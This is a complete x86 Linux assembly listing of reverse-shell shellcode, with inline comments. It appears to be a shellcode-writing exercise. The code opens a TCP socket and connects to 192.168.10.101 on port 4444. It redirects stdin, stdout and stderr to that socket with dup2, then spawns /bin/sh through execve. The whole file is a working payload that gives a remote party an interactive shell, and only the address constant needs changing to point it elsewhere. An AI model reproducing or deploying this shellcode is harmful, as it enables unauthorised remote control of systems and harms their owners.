section .text
global _start

_start:
	xor eax, eax
	mov al, 0x66	; eax = 0x66 (sys_socketcall)

	xor ebx, ebx
	inc ebx		; ebx = 0x1 (SYS_SOCKET)
	
	xor esi, esi	; esi = 0x0
	push esi	; 0 = IPPROTO_IP
	push ebx	; 1 = SOCK_STREAM
	push 0x2	; 2 = AF_INET

	mov ecx, esp	; ecx = args array structure
	int 0x80	; syscall

	xchg edi, eax	; save the file descriptor returned to eax in edi
	xor eax, eax	; clear eax

	mov al, 0x66
	inc ebx

	push dword 0x650aa8c0	; Address: 192.168.10.101
	push word 0x5C11	; Port: 4444
	push word bx		; 2 = AF_INET

	mov ecx, esp	; ecx = pointer to sockaddr struct
	
	push byte 16	; addrlen
	push ecx	; sockaddr
	push edi	; socketfd
	mov ecx, esp	; ecx = args array for the syscall

	inc ebx		; ebx = 0x3 (SYS_CONNECT)

	int 0x80	; syscall

	xor ecx, ecx
	mov cl, 0x2	; loop counter
	mov ebx, edi	; pass sockfd to ebx

	loop:
	  mov al, 0x3f	; al = 0x3f (sys_dup2)
	  int 0x80	; syscall
	  dec ecx	; decrement ecx (arg for the file descriptor)
	  jns loop

	mov al, 0x0B	; al = = 0x0b (sys_execve)
	push esi	; 0 = string terminator
	push dword 0x68732f2f ; //sh
	push dword 0x6e69622f ; /bin
	mov ebx, esp

	push esi
	push ebx
	mov ecx, esp	; argv = [ filename, 0 ]
	mov edx, esi	; envp = NULL

	int 0x80 ; syscall
